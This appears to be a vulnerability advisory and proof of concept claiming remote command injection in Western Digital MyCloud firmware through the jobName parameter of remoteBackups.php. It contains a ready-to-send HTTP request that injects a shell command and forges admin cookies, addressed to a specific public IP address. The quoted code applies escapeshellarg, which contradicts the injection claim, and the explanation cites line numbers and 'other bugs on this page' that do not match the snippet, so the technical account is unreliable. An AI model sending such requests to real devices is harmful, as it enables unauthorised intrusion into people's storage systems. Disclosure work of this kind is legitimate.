## Western Digital MyCloud v2.42.115 Remote Command Injection in remoteBackups.php

#### The latest firmware download link:https://downloads.wdc.com/nas/My_Cloud_GLCR_2.42.115.bin

### Description

A remote command execution bug exists in the `php/remoteBackups.php` script with in the Western Digital MyCloud <=v2.42.115 web interface.

##### Remote Command Execution

The `php/remoteBackups.php` file is vulnerable to a remote command execution bug allowing for a logged in user to execute commands.The following code illustrates the vulnerability.

`php/remoteBackups.php`

```
$cmd = $_REQUEST['cmd'];
$RemoteBackupsAPI = new RemoteBackupsAPI;

switch ($cmd) {
	case "getRecoverItems":
		$RemoteBackupsAPI->getRecoverItems();
		break;
}


class RemoteBackupsAPI{
	public function getRecoverItems()
	{
		$xmlPath = "/var/www/xml/rsync_recover_items.xml";
		$jobName = $_REQUEST['jobName'];
		
		@unlink($xmlPath);
		
		$cmd = sprintf("rsyncmd -l \"$xmlPath\" -r %s >/dev/null", escapeshellarg($jobName));
		system($cmd);
```

![image-20250528154959691](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281549907.png)

```
On line 17 above the "$cmd" variable is used to determine the path of the code through the use of a switch statement (even though there is only 1 case). If "$cmd" is set to "getRecoverItems", we reach the getRecoverItems() method of the "RemoteBackupsAPI" class. Within this function, the "jobName" request variable (which can be a cookie, get or post value) is loaded into the "$jobName" local var (Ln. 32). From here, a pattern similar to all the rest of the command injection bugs on this page is used which consists of loading the user supplied value (within jobName) into the syntax of an argument for a command (Ln 36). The value is then stored in the "$cmd" variable and used in the PHP system() call on line 37.
```

### **POC**

- Add the cookie `Cookie: isAdmin=1;username=admin`

```http
GET /web/php/remoteBackups.php?cmd=getRecoverItems&jobName=%22;id;%22 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: keep-alive
Cookie: isAdmin=1;username=admin
Host: 213.60.33.2
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
```



![image-20250528144722615](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281447883.png)
